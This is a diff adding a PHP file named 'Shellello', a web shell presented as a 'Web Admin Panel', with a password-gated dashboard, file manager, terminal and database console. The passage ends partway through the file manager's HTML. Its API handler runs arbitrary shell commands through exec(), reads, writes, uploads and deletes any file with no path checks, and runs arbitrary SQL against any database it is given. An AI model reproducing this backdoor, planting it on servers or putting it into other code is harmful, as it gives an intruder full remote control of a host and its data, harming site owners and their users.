@@ -1,0 +1,2312 @@
+<?php
+/**
+ * Shellello - Web Admin Panel
+ * PHP Edition v1.0.0
+ * Built: 2025-11-28 16:43:20
+ */
+
+// ========== 01_CONFIG ==========
+/**
+ * Shellello - Module 01: Configuration & Setup
+ * Version: 2.4.0
+ */
+
+session_start();
+error_reporting(E_ALL);
+ini_set('display_errors', 0);
+
+// ==========================================
+// CONFIGURATION
+// ==========================================
+define('APP_NAME', 'Shellello Admin');
+define('APP_VERSION', '2.4.0');
+
+// SHA-256 hash of your password
+// Generate with: echo -n "yourpassword" | sha256sum
+define('AUTH_HASH', '432d8194182647bfe08cae6592b190a7d35be2c9d302e25e4d070d404501d7fd');
+
+// ========== 02_AUTH ==========
+/**
+ * Shellello - Module 02: Authentication Functions
+ */
+
+function isAuthenticated() {
+    return isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;
+}
+
+function attemptLogin($password) {
+    if (hash('sha256', $password) === AUTH_HASH) {
+        $_SESSION['authenticated'] = true;
+        $_SESSION['login_time'] = time();
+        $_SESSION['token'] = bin2hex(random_bytes(32));
+        return true;
+    }
+    return false;
+}
+
+function logout() {
+    session_destroy();
+    header("Location: ?");
+    exit;
+}
+
+function getSessionTime() {
+    if (!isset($_SESSION['login_time'])) return '0m';
+    $diff = time() - $_SESSION['login_time'];
+    $hours = floor($diff / 3600);
+    $mins = floor(($diff % 3600) / 60);
+    return ($hours > 0 ? "{$hours}h " : "") . "{$mins}m";
+}
+
+// ========== 03_HELPERS ==========
+/**
+ * Shellello - Module 03: Helper Functions
+ */
+
+function formatBytes($bytes) {
+    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
+    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
+    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
+    return $bytes . ' B';
+}
+
+function getFileList($dir) {
+    $files = [];
+    if (is_dir($dir) && is_readable($dir)) {
+        foreach (scandir($dir) as $item) {
+            if ($item === '.') continue;
+            $path = $dir . DIRECTORY_SEPARATOR . $item;
+            $isDir = is_dir($path);
+            $files[] = [
+                'name' => $item,
+                'type' => $isDir ? 'dir' : 'file',
+                'size' => $isDir ? '-' : formatBytes(@filesize($path)),
+                'perms' => substr(sprintf('%o', @fileperms($path)), -4),
+                'modified' => date("Y-m-d H:i", @filemtime($path)),
+                'readable' => is_readable($path),
+                'writable' => is_writable($path)
+            ];
+        }
+        usort($files, function($a, $b) {
+            if ($a['name'] === '..') return -1;
+            if ($b['name'] === '..') return 1;
+            if ($a['type'] === $b['type']) return strcasecmp($a['name'], $b['name']);
+            return $a['type'] === 'dir' ? -1 : 1;
+        });
+    }
+    return $files;
+}
+
+function getDbConnection() {
+    if (!isset($_SESSION['db'])) return null;
+    $db = $_SESSION['db'];
+    $dsn = "{$db['driver']}:host={$db['host']};port={$db['port']};dbname={$db['dbname']}";
+    return new PDO($dsn, $db['user'], $db['pass'], [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
+}
+
+// ========== 04_API ==========
+/**
+ * Shellello - Module 04: API Action Handler
+ */
+
+function handleApiAction($action) {
+    header('Content-Type: application/json');
+    $response = ['status' => 'error', 'message' => 'Unknown action'];
+
+    try {
+        switch ($action) {
+            // ========== FILE MANAGER ACTIONS ==========
+            case 'list_files':
+                $path = $_GET['path'] ?? getcwd();
+                $path = realpath($path) ?: getcwd();
+                $response = ['status' => 'success', 'data' => getFileList($path), 'path' => $path];
+                break;
+
+            case 'read_file':
+                $path = $_GET['path'] ?? '';
+                if (file_exists($path) && is_file($path) && is_readable($path)) {
+                    $response = ['status' => 'success', 'content' => file_get_contents($path)];
+                } else {
+                    $response = ['status' => 'error', 'message' => 'File not found or not readable'];
+                }
+                break;
+
+            case 'save_file':
+                $path = $_POST['path'] ?? '';
+                $content = $_POST['content'] ?? '';
+                if ($path && file_put_contents($path, $content) !== false) {
+                    $response = ['status' => 'success', 'message' => 'File saved successfully'];
+                } else {
+                    $response = ['status' => 'error', 'message' => 'Failed to save file'];
+                }
+                break;
+
+            case 'create_file':
+                $path = $_POST['path'] ?? '';
+                $name = $_POST['name'] ?? '';
+                $fullPath = rtrim($path, '/') . '/' . $name;
+                if (!file_exists($fullPath)) {
+                    if (file_put_contents($fullPath, '') !== false) {
+                        $response = ['status' => 'success', 'message' => 'File created'];
+                    } else {
+                        $response = ['status' => 'error', 'message' => 'Failed to create file'];
+                    }
+                } else {
+                    $response = ['status' => 'error', 'message' => 'File already exists'];
+                }
+                break;
+
+            case 'create_folder':
+                $path = $_POST['path'] ?? '';
+                $name = $_POST['name'] ?? '';
+                $fullPath = rtrim($path, '/') . '/' . $name;
+                if (!file_exists($fullPath)) {
+                    if (mkdir($fullPath, 0755, true)) {
+                        $response = ['status' => 'success', 'message' => 'Folder created'];
+                    } else {
+                        $response = ['status' => 'error', 'message' => 'Failed to create folder'];
+                    }
+                } else {
+                    $response = ['status' => 'error', 'message' => 'Folder already exists'];
+                }
+                break;
+
+            case 'delete_item':
+                $path = $_POST['path'] ?? '';
+                if (file_exists($path)) {
+                    if (is_dir($path)) {
+                        if (@rmdir($path)) {
+                            $response = ['status' => 'success', 'message' => 'Folder deleted'];
+                        } else {
+                            $response = ['status' => 'error', 'message' => 'Folder not empty or permission denied'];
+                        }
+                    } else {
+                        if (@unlink($path)) {
+                            $response = ['status' => 'success', 'message' => 'File deleted'];
+                        } else {
+                            $response = ['status' => 'error', 'message' => 'Permission denied'];
+                        }
+                    }
+                } else {
+                    $response = ['status' => 'error', 'message' => 'Item not found'];
+                }
+                break;
+
+            case 'rename_item':
+                $oldPath = $_POST['old_path'] ?? '';
+                $newName = $_POST['new_name'] ?? '';
+                $dir = dirname($oldPath);
+                $newPath = $dir . '/' . $newName;
+                if (file_exists($oldPath) && !file_exists($newPath)) {
+                    if (rename($oldPath, $newPath)) {
+                        $response = ['status' => 'success', 'message' => 'Renamed successfully'];
+                    } else {
+                        $response = ['status' => 'error', 'message' => 'Failed to rename'];
+                    }
+                } else {
+                    $response = ['status' => 'error', 'message' => 'Cannot rename - file exists or source not found'];
+                }
+                break;
+
+            case 'upload_file':
+                $path = $_POST['path'] ?? getcwd();
+                if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
+                    $target = rtrim($path, '/') . '/' . basename($_FILES['file']['name']);
+                    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
+                        $response = ['status' => 'success', 'message' => 'File uploaded'];
+                    } else {
+                        $response = ['status' => 'error', 'message' => 'Upload failed'];
+                    }
+                } else {
+                    $response = ['status' => 'error', 'message' => 'No file uploaded'];
+                }
+                break;
+
+            case 'download_file':
+                $path = $_GET['path'] ?? '';
+                if (file_exists($path) && is_file($path)) {
+                    header('Content-Type: application/octet-stream');
+                    header('Content-Disposition: attachment; filename="' . basename($path) . '"');
+                    header('Content-Length: ' . filesize($path));
+                    readfile($path);
+                    exit;
+                }
+                $response = ['status' => 'error', 'message' => 'File not found'];
+                break;
+
+            // ========== TERMINAL ACTIONS ==========
+            case 'exec_cmd':
+                $cmd = $_POST['cmd'] ?? '';
+                $cwd = $_POST['cwd'] ?? getcwd();
+                if (!empty($cmd)) {
+                    $output = [];
+                    $oldCwd = getcwd();
+                    if (is_dir($cwd)) chdir($cwd);
+                    exec($cmd . " 2>&1", $output, $exitCode);
+                    $newCwd = getcwd();
+                    chdir($oldCwd);
+                    $response = [
+                        'status' => 'success',
+                        'output' => implode("\n", $output),
+                        'exit_code' => $exitCode,
+                        'cwd' => $newCwd
+                    ];
+                } else {
+                    $response = ['status' => 'error', 'message' => 'No command provided'];
+                }
+                break;
+
+            // ========== DATABASE ACTIONS ==========
+            case 'db_connect':
+                $driver = $_POST['driver'] ?? 'mysql';
+                $host = $_POST['host'] ?? 'localhost';
+                $port = $_POST['port'] ?? ($driver === 'mysql' ? '3306' : '5432');
+                $user = $_POST['user'] ?? '';
+                $pass = $_POST['pass'] ?? '';
+                $dbname = $_POST['dbname'] ?? '';
+
+                try {
+                    $dsn = "{$driver}:host={$host};port={$port}" . ($dbname ? ";dbname={$dbname}" : "");
+                    $pdo = new PDO($dsn, $user, $pass, [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]);
+                    
+                    $_SESSION['db'] = compact('driver', 'host', 'port', 'user', 'pass', 'dbname');
+                    
+                    if ($driver === 'mysql') {
+                        $databases = $pdo->query("SHOW DATABASES")->fetchAll(PDO::FETCH_COLUMN);
+                    } else {
+                        $databases = $pdo->query("SELECT datname FROM pg_database WHERE datistemplate = false")->fetchAll(PDO::FETCH_COLUMN);
+                    }
+                    
+                    $response = ['status' => 'success', 'message' => 'Connected!', 'databases' => $databases];
+                } catch (PDOException $e) {
+                    $response = ['status' => 'error', 'message' => 'Connection failed: ' . $e->getMessage()];
+                }
+                break;
+
+            case 'db_tables':
+                if (!isset($_SESSION['db'])) {
+                    $response = ['status' => 'error', 'message' => 'Not connected'];
+                    break;
+                }
+                try {
+                    $pdo = getDbConnection();
+                    $driver = $_SESSION['db']['driver'];
+                    if ($driver === 'mysql') {
+                        $tables = $pdo->query("SHOW TABLES")->fetchAll(PDO::FETCH_COLUMN);
+                    } else {
+                        $tables = $pdo->query("SELECT tablename FROM pg_tables WHERE schemaname = 'public'")->fetchAll(PDO::FETCH_COLUMN);
+                    }
+                    $response = ['status' => 'success', 'tables' => $tables];
+                } catch (PDOException $e) {
+                    $response = ['status' => 'error', 'message' => $e->getMessage()];
+                }
+                break;
+
+            case 'db_query':
+                if (!isset($_SESSION['db'])) {
+                    $response = ['status' => 'error', 'message' => 'Not connected'];
+                    break;
+                }
+                $sql = $_POST['sql'] ?? '';
+                try {
+                    $pdo = getDbConnection();
+                    $stmt = $pdo->query($sql);
+                    $isSelect = stripos(trim($sql), 'SELECT') === 0;
+                    
+                    if ($isSelect) {
+                        $data = $stmt->fetchAll(PDO::FETCH_ASSOC);
+                        $response = ['status' => 'success', 'data' => $data, 'count' => count($data)];
+                    } else {
+                        $response = ['status' => 'success', 'message' => 'Query executed', 'affected' => $stmt->rowCount()];
+                    }
+                } catch (PDOException $e) {
+                    $response = ['status' => 'error', 'message' => $e->getMessage()];
+                }
+                break;
+
+            case 'db_disconnect':
+                unset($_SESSION['db']);
+                $response = ['status' => 'success', 'message' => 'Disconnected'];
+                break;
+
+            case 'phpinfo':
+                phpinfo();
+                exit;
+        }
+    } catch (Exception $e) {
+        $response = ['status' => 'error', 'message' => $e->getMessage()];
+    }
+
+    echo json_encode($response);
+    exit;
+}
+
+// ========== 05_LOGIN ==========
+/**
+ * Shellello - Module 05: Login Page
+ */
+
+function renderLogin($error = null) {
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - <?php echo APP_NAME; ?></title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: linear-gradient(135deg, #1e3a5f 0%, #0d1b2a 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-container {
+            background: rgba(255,255,255,0.95);
+            padding: 3rem;
+            border-radius: 16px;
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            width: 100%;
+            max-width: 420px;
+            text-align: center;
+        }
+        .logo { font-size: 3.5rem; margin-bottom: 0.5rem; }
+        h1 { color: #1e3a5f; font-size: 1.75rem; margin-bottom: 0.5rem; }
+        .subtitle { color: #64748b; font-size: 0.9rem; margin-bottom: 2rem; }
+        .error {
+            background: #fee2e2;
+            border: 1px solid #fecaca;
+            color: #dc2626;
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            margin-bottom: 1.5rem;
+            font-size: 0.9rem;
+        }
+        .form-group { margin-bottom: 1.5rem; text-align: left; }
+        label {
+            display: block;
+            color: #374151;
+            font-weight: 500;
+            margin-bottom: 0.5rem;
+            font-size: 0.9rem;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 0.875rem 1rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.2s;
+        }
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #3b82f6;
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+        }
+        button {
+            width: 100%;
+            padding: 1rem;
+            background: linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(59,130,246,0.3);
+        }
+        .version { margin-top: 2rem; color: #9ca3af; font-size: 0.8rem; }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">🐚</div>
+        <h1><?php echo APP_NAME; ?></h1>
+        <p class="subtitle">Web Administration Interface</p>
+        
+        <?php if ($error): ?>
+            <div class="error"><?php echo htmlspecialchars($error); ?></div>
+        <?php endif; ?>
+        
+        <form method="post">
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required autofocus>
+            </div>
+            <button type="submit">Sign In</button>
+        </form>
+        
+        <p class="version">Version <?php echo APP_VERSION; ?></p>
+    </div>
+</body>
+</html>
+<?php
+    exit;
+}
+
+// ========== 06_LAYOUT ==========
+/**
+ * Shellello - Module 06: Main Layout Template
+ */
+
+function renderLayout($title, $content, $activePage = 'dashboard') {
+    $nav = [
+        'dashboard' => ['icon' => '📊', 'label' => 'Dashboard'],
+        'files' => ['icon' => '📁', 'label' => 'File Manager'],
+        'database' => ['icon' => '🗄️', 'label' => 'Database'],
+        'terminal' => ['icon' => '💻', 'label' => 'Terminal'],
+        'settings' => ['icon' => '⚙️', 'label' => 'Settings'],
+    ];
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><?php echo htmlspecialchars($title); ?> - <?php echo APP_NAME; ?></title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        :root {
+            --primary: #3b82f6;
+            --primary-dark: #1d4ed8;
+            --sidebar-bg: #0f172a;
+            --sidebar-hover: #1e293b;
+            --bg: #f1f5f9;
+            --card-bg: #ffffff;
+            --text: #1f2937;
+            --text-muted: #6b7280;
+            --border: #e5e7eb;
+        }
+        body {
+            font-family: 'Segoe UI', system-ui, sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            display: flex;
+            min-height: 100vh;
+        }
+        .sidebar {
+            width: 260px;
+            background: var(--sidebar-bg);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            position: fixed;
+            height: 100vh;
+            z-index: 100;
+        }
+        .sidebar-header {
+            padding: 1.5rem;
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        .sidebar-header .logo { font-size: 2rem; }
+        .sidebar-header h1 { font-size: 1.25rem; font-weight: 600; }
+        .nav { flex: 1; padding: 1rem 0; overflow-y: auto; }
+        .nav a {
+            display: flex;
+            align-items: center;
+            gap: 0.875rem;
+            padding: 0.875rem 1.5rem;
+            color: #94a3b8;
+            text-decoration: none;
+            transition: all 0.2s;
+            border-left: 3px solid transparent;
+        }
+        .nav a:hover { background: var(--sidebar-hover); color: white; }
+        .nav a.active {
+            background: var(--sidebar-hover);
+            color: white;
+            border-left-color: var(--primary);
+        }
+        .nav a .nav-icon { font-size: 1.25rem; width: 28px; text-align: center; }
+        .nav a .nav-label { font-size: 0.95rem; }
+        .sidebar-footer {
+            padding: 1rem 1.5rem;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        .sidebar-footer a {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            color: #ef4444;
+            text-decoration: none;
+            padding: 0.5rem 0;
+            font-size: 0.9rem;
+        }
+        .sidebar-footer a:hover { color: #f87171; }
+        .main {
+            flex: 1;
+            margin-left: 260px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        .header {
+            background: var(--card-bg);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            position: sticky;
+            top: 0;
+            z-index: 50;
+        }
+        .header h2 { font-size: 1.5rem; font-weight: 600; }
+        .header-info {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+        .content {
+            flex: 1;
+            padding: 2rem;
+            max-width: 1600px;
+            width: 100%;
+            margin: 0 auto;
+        }
+        .card {
+            background: var(--card-bg);
+            border-radius: 12px;
+            padding: 1.5rem;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+            margin-bottom: 1.5rem;
+        }
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            padding: 0.5rem 1rem;
+            border-radius: 8px;
+            border: none;
+            font-size: 0.9rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+        }
+        .btn-primary { background: var(--primary); color: white; }
+        .btn-primary:hover { background: var(--primary-dark); }
+        .btn-secondary { background: #e5e7eb; color: #374151; }
+        .btn-secondary:hover { background: #d1d5db; }
+        .btn-danger { background: #ef4444; color: white; }
+        .btn-danger:hover { background: #dc2626; }
+        .btn-sm { padding: 0.375rem 0.75rem; font-size: 0.8rem; }
+        .form-control {
+            padding: 0.625rem 0.875rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            font-size: 0.95rem;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(59,130,246,0.1);
+        }
+        table { width: 100%; border-collapse: collapse; }
+        th, td {
+            padding: 0.75rem 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th {
+            background: #f8fafc;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+        tr:hover { background: #f8fafc; }
+        .text-muted { color: var(--text-muted); }
+        .text-success { color: #22c55e; }
+        .text-danger { color: #ef4444; }
+        .text-center { text-align: center; }
+    </style>
+</head>
+<body>
+    <aside class="sidebar">
+        <div class="sidebar-header">
+            <span class="logo">🐚</span>
+            <h1><?php echo APP_NAME; ?></h1>
+        </div>
+        <nav class="nav">
+            <?php foreach ($nav as $key => $item): ?>
+                <a href="?page=<?php echo $key; ?>" class="<?php echo $activePage === $key ? 'active' : ''; ?>">
+                    <span class="nav-icon"><?php echo $item['icon']; ?></span>
+                    <span class="nav-label"><?php echo $item['label']; ?></span>
+                </a>
+            <?php endforeach; ?>
+        </nav>
+        <div class="sidebar-footer">
+            <a href="?logout=1">
+                <span>🚪</span>
+                <span>Logout</span>
+            </a>
+        </div>
+    </aside>
+    
+    <div class="main">
+        <header class="header">
+            <h2><?php echo htmlspecialchars($title); ?></h2>
+            <div class="header-info">
+                <span>Session: <?php echo getSessionTime(); ?></span>
+                <span>|</span>
+                <span><?php echo date('M j, Y H:i'); ?></span>
+            </div>
+        </header>
+        <main class="content">
+            <?php echo $content; ?>
+        </main>
+    </div>
+</body>
+</html>
+<?php
+}
+
+// ========== 07_DASHBOARD ==========
+/**
+ * Shellello - Module 07: Dashboard Page
+ */
+
+function renderDashboard() {
+    $phpVersion = phpversion();
+    $serverSoftware = $_SERVER['SERVER_SOFTWARE'] ?? 'CLI';
+    $diskFree = @disk_free_space("/") ?: 0;
+    $diskTotal = @disk_total_space("/") ?: 1;
+    $diskUsed = $diskTotal - $diskFree;
+    $diskPercent = round(($diskUsed / $diskTotal) * 100, 1);
+    $memUsage = memory_get_usage(true);
+    
+    ob_start();
+?>
+<style>
+.dashboard-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(350px, 1fr));
+    gap: 1.5rem;
+}
+.card-header {
+    display: flex;
+    align-items: center;
+    gap: 0.75rem;
+    margin-bottom: 1.25rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px solid #e5e7eb;
+}
+.card-header h3 { margin: 0; font-size: 1.1rem; color: #1f2937; }
+.card-icon { font-size: 1.5rem; }
+.info-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 0.625rem 0;
+    border-bottom: 1px solid #f3f4f6;
+}
+.info-row:last-child { border-bottom: none; }
+.info-label { color: #6b7280; font-size: 0.9rem; }
+.info-value { color: #1f2937; font-weight: 500; font-size: 0.9rem; }
+.progress-container { margin-bottom: 1.5rem; }
+.progress-bar {
+    height: 12px;
+    background: #e5e7eb;
+    border-radius: 6px;
+    overflow: hidden;
+    margin-bottom: 0.5rem;
+}
+.progress-fill { height: 100%; border-radius: 6px; transition: width 0.3s; }
+.progress-label { text-align: right; font-size: 0.85rem; color: #6b7280; }
+.disk-stats { display: flex; justify-content: space-between; text-align: center; }
+.disk-stat { flex: 1; }
+.stat-value { display: block; font-size: 1.25rem; font-weight: 600; color: #1f2937; }
+.stat-label { font-size: 0.8rem; color: #6b7280; }
+.quick-actions { display: grid; grid-template-columns: repeat(2, 1fr); gap: 1rem; }
+.quick-btn {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+    padding: 1.25rem;
+    background: #f8fafc;
+    border-radius: 12px;
+    text-decoration: none;
+    color: #374151;
+    transition: all 0.2s;
+    border: 2px solid transparent;
+}
+.quick-btn:hover {
+    background: #eff6ff;
+    border-color: #3b82f6;
+    transform: translateY(-2px);
+}
+.quick-btn span:first-child { font-size: 1.75rem; }
+.quick-btn span:last-child { font-weight: 500; font-size: 0.9rem; }
+</style>
+
+<div class="dashboard-grid">
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">💻</span>
+            <h3>System Information</h3>
+        </div>
+        <div class="card-body">
+            <div class="info-row">
+                <span class="info-label">Operating System</span>
+                <span class="info-value"><?php echo htmlspecialchars(php_uname('s') . ' ' . php_uname('r')); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Hostname</span>
+                <span class="info-value"><?php echo htmlspecialchars(php_uname('n')); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Architecture</span>
+                <span class="info-value"><?php echo htmlspecialchars(php_uname('m')); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">PHP Version</span>
+                <span class="info-value"><?php echo $phpVersion; ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Web Server</span>
+                <span class="info-value"><?php echo htmlspecialchars($serverSoftware); ?></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">💾</span>
+            <h3>Disk Usage</h3>
+        </div>
+        <div class="card-body">
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" style="width: <?php echo $diskPercent; ?>%; background: <?php echo $diskPercent > 80 ? '#ef4444' : ($diskPercent > 60 ? '#f59e0b' : '#22c55e'); ?>"></div>
+                </div>
+                <div class="progress-label"><?php echo $diskPercent; ?>% Used</div>
+            </div>
+            <div class="disk-stats">
+                <div class="disk-stat">
+                    <span class="stat-value"><?php echo formatBytes($diskUsed); ?></span>
+                    <span class="stat-label">Used</span>
+                </div>
+                <div class="disk-stat">
+                    <span class="stat-value"><?php echo formatBytes($diskFree); ?></span>
+                    <span class="stat-label">Free</span>
+                </div>
+                <div class="disk-stat">
+                    <span class="stat-value"><?php echo formatBytes($diskTotal); ?></span>
+                    <span class="stat-label">Total</span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">🔐</span>
+            <h3>Session Info</h3>
+        </div>
+        <div class="card-body">
+            <div class="info-row">
+                <span class="info-label">Session Duration</span>
+                <span class="info-value"><?php echo getSessionTime(); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Your IP</span>
+                <span class="info-value"><?php echo $_SERVER['REMOTE_ADDR'] ?? 'Unknown'; ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Memory Usage</span>
+                <span class="info-value"><?php echo formatBytes($memUsage); ?></span>
+            </div>
+            <div class="info-row">
+                <span class="info-label">Current Path</span>
+                <span class="info-value" style="font-size: 0.8rem;"><?php echo getcwd(); ?></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="card">
+        <div class="card-header">
+            <span class="card-icon">⚡</span>
+            <h3>Quick Actions</h3>
+        </div>
+        <div class="card-body">
+            <div class="quick-actions">
+                <a href="?page=files" class="quick-btn">
+                    <span>📁</span>
+                    <span>File Manager</span>
+                </a>
+                <a href="?page=database" class="quick-btn">
+                    <span>🗄️</span>
+                    <span>Database</span>
+                </a>
+                <a href="?page=terminal" class="quick-btn">
+                    <span>💻</span>
+                    <span>Terminal</span>
+                </a>
+                <a href="?page=settings" class="quick-btn">
+                    <span>⚙️</span>
+                    <span>Settings</span>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+<?php
+    $content = ob_get_clean();
+    renderLayout('Dashboard', $content, 'dashboard');
+}
+
+// ========== 08_FILES ==========
+/**
+ * Shellello - Module 08: File Manager Page
+ */
+
+function renderFileManager() {
+    $currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
+    if (!$currentPath) $currentPath = getcwd();
+    
+    ob_start();
+?>
+<style>
+.toolbar {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 1rem;
+}
+.path-nav {
+    display: flex;
+    align-items: center;
+    gap: 0.5rem;
+    flex: 1;
+    min-width: 300px;
+}
+.path-label { font-size: 1.25rem; }
+.path-input {
+    flex: 1;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 0.9rem;
+}
+.toolbar-actions { display: flex; gap: 0.5rem; }
+.file-table { margin: 0; }
+.file-table tbody tr { cursor: pointer; }
+.file-table tbody tr:hover { background: #eff6ff; }
+.file-icon { margin-right: 0.5rem; }
+.file-name { font-weight: 500; }
+.file-name.dir { color: #2563eb; }
+.action-btns { display: flex; gap: 0.25rem; }
+.action-btn {
+    padding: 0.25rem 0.5rem;
+    background: transparent;
+    border: 1px solid #e5e7eb;
+    border-radius: 4px;
+    cursor: pointer;
+    font-size: 0.85rem;
+    transition: all 0.15s;
+}
+.action-btn:hover { background: #f3f4f6; }
+.action-btn.danger:hover { background: #fef2f2; border-color: #fecaca; }
+.modal-overlay {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: rgba(0,0,0,0.5);
+    z-index: 1000;
+    align-items: center;
+    justify-content: center;
+}
+.modal-overlay.show { display: flex; }
+.modal {
+    background: white;
+    border-radius: 12px;
+    width: 90%;
+    max-width: 500px;
+    box-shadow: 0 25px 50px rgba(0,0,0,0.25);
+}
+.modal.modal-lg { max-width: 900px; }
+.modal-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid #e5e7eb;
+}
+.modal-header h3 { margin: 0; font-size: 1.1rem; }
+.modal-close {
+    background: none;
+    border: none;
+    font-size: 1.5rem;
+    cursor: pointer;
+    color: #6b7280;
+}
+.modal-body { padding: 1.5rem; }
+.modal-body label { display: block; margin-bottom: 0.5rem; font-weight: 500; }
+.modal-body .form-control { width: 100%; margin-bottom: 1rem; }
+.modal-footer {
+    display: flex;
+    justify-content: flex-end;
+    gap: 0.75rem;
+    padding: 1rem 1.5rem;
+    border-top: 1px solid #e5e7eb;
+    background: #f9fafb;
+    border-radius: 0 0 12px 12px;
+}
+.file-editor {
+    width: 100%;
+    height: 450px;
+    font-family: 'Consolas', 'Monaco', monospace;
+    font-size: 0.9rem;
+    padding: 1rem;
+    border: 1px solid #e5e7eb;
+    border-radius: 8px;
+    background: #1e293b;
+    color: #e2e8f0;
+    resize: vertical;
+}
+.upload-zone {
+    border: 2px dashed #d1d5db;
+    border-radius: 12px;
+    padding: 2rem;
+    text-align: center;
+    cursor: pointer;
+}
+.upload-zone:hover { border-color: #3b82f6; background: #eff6ff; }
+</style>
+
+<div class="file-manager">
+    <div class="card toolbar">
+        <div class="path-nav">
+            <span class="path-label">📍</span>
+            <input type="text" id="currentPath" class="form-control path-input" value="<?php echo htmlspecialchars($currentPath); ?>" readonly>
+            <button class="btn btn-secondary btn-sm" onclick="goToPath()">Go</button>
+            <button class="btn btn-secondary btn-sm" onclick="goUp()">⬆️ Up</button>
+            <button class="btn btn-secondary btn-sm" onclick="refreshFiles()">🔄</button>
+        </div>
+        <div class="toolbar-actions">
+            <button class="btn btn-primary btn-sm" onclick="showModal('newFileModal')">📄 New File</button>
+            <button class="btn btn-primary btn-sm" onclick="showModal('newFolderModal')">📁 New Folder</button>
+            <button class="btn btn-primary btn-sm" onclick="showModal('uploadModal')">⬆️ Upload</button>
+        </div>
+    </div>
+
+    <div class="card">
+        <table class="file-table">
+            <thead>
+                <tr>
+                    <th>Name</th>
+                    <th>Size</th>
+                    <th>Perms</th>
+                    <th>Modified</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="fileList">
+                <tr><td colspan="5" class="text-center text-muted">Loading...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <!-- Editor Modal -->
+    <div class="modal-overlay" id="editorModal">
+        <div class="modal modal-lg">
+            <div class="modal-header">
+                <h3 id="editorTitle">Edit File</h3>
+                <button class="modal-close" onclick="closeModal('editorModal')">&times;</button>
+            </div>
+            <div class="modal-body">
+                <textarea id="fileEditor" class="file-editor"></textarea>
